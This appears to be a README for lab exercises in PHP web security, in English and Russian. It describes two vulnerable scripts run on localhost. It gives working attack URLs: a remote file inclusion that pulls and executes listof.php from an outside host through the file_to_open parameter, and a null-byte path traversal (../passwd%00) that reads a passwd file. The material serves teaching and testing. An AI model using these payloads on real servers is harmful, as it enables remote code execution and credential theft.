These are test tasks on web security. Description and instructions for reproducing the attack follows.
All the tasks are tested and worked on OpenServer 4.8.7, though the configuration of the server doesn't matter.
The server name is assumed to be 'localhost'.

Task 1
Участвующие файлы:

task1.php, располагается в корневой папке атакуемого сервера.

На сервере должны быть включены register_globals, allow_url_fopen и allow_url_include.
 
Для взлома данная страница открывается через url

http://localhost/task1.php?file_to_open=http://biomechanics.ru/listof.php

В данных настройках это приведет к подключению удаленного файла listof.php в скрипт task1.php и его исполнению.

Для атаки нужно знать имя переменной file_to_open


Task 2
Участвующие файлы:

task2.php, располагается в корневой папке атакуемого сервера.

passwd, располагается в папке на один уровень выше (предположительно недоступной для просмотра веб-пользователям).


Для взлома используется вставка нулевого байта в нотации C++ в плохо экранированную строку, которая используется в параметре функции require_once. Для этого страница открывается через url

http://localhost/task2.php?file=../passwd%00
 
При этом файл passwd выдается на страницу. В результате получается следующий вывод:

"admin	pass task2 worked"
